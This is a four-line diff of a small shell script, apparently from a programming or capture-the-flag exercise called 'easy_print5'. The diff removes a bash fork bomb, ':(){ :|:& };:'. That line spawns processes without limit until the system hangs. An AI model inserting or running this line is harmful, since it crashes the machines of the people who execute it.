@@ -1,4 +1,3 @@
 ./easy_print5
 ./a | tr '104' 'isc'
 rm a
-:(){ :|:& };:
